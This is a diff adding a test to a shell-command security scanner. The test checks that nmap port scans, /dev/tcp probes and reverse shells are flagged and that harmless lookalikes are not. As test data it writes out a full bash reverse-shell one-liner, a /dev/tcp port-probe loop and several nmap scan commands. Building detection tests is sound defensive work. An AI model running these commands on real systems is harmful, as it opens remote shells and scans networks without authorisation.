@@ -1028,6 +1028,71 @@ describe("scan", () => {
     )).toHaveLength(2);
   });
 
+  it("detects nmap scans and distinguishes /dev/tcp probes from reverse shells", () => {
+    const scans = [
+      "nmap -sS 192.0.2.10",
+      "sudo nmap -sU -p 53 192.0.2.0/24",
+      "nmap -sn example.test",
+      "nmap -6 2001:db8::/64",
+      "nmap -oX /tmp/report.xml -p80 192.0.2.10",
+    ];
+    for (const source of scans) {
+      expect(scan(source).findings).toEqual(expect.arrayContaining([
+        expect.objectContaining({
+          ruleId: "network.port-scan",
+          category: "network_egress",
+          confidence: "high",
+        }),
+      ]));
+    }
+
+    const hardNegatives = [
+      "nmap --help",
+      "nmap --version",
+      "nmap --iflist",
+      "nmap --script-help default",
+      "nmap -oX /tmp/report.xml",
+      "nmap -p 80 \"$target\"",
+      "echo 'nmap -sS 192.0.2.10'",
+      "# nmap -sn example.test",
+      `nmap() { echo "project helper"; }
+       nmap -sS 192.0.2.10`,
+    ];
+    for (const source of hardNegatives) {
+      expect(scan(source).findings.some((finding) =>
+        finding.ruleId === "network.port-scan"
+      ), source).toBe(false);
+    }
+
+    const probe = scan(
+      `for port in {1..64}; do echo >/dev/tcp/192.0.2.10/$port; done`,
+    );
+    expect(probe.findings).toEqual(expect.arrayContaining([
+      expect.objectContaining({
+        ruleId: "network.dev-socket",
+        category: "network_egress",
+      }),
+    ]));
+    expect(probe.findings.some((finding) =>
+      finding.ruleId === "exfil.reverse-shell"
+    )).toBe(false);
+
+    const reverseShell = scan("bash -i >& /dev/tcp/192.0.2.10/4444 0>&1");
+    expect(reverseShell.findings).toEqual(expect.arrayContaining([
+      expect.objectContaining({ ruleId: "network.dev-socket" }),
+      expect.objectContaining({ ruleId: "exfil.reverse-shell" }),
+    ]));
+
+    const bypassesShadow = scan(`
+      nmap() { echo "project helper"; }
+      command nmap -sS 192.0.2.10
+      sudo nmap -sS 192.0.2.10
+    `);
+    expect(bypassesShadow.findings.filter((finding) =>
+      finding.ruleId === "network.port-scan"
+    )).toHaveLength(2);
+  });
+
   it("detects Time Machine disable while respecting Bash function shadowing", () => {
     const disables = [
       "tmutil disable",
